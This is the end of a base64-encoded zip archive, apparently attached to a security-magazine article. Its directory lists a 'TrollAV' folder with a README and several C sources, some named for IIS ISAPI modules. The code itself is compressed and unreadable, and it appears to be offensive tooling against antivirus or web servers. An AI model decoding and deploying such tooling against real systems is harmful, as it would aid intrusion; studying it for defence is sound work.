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
+====
+<-->
+
+|=[ EOF ]=---------------------------------------------------------------=|
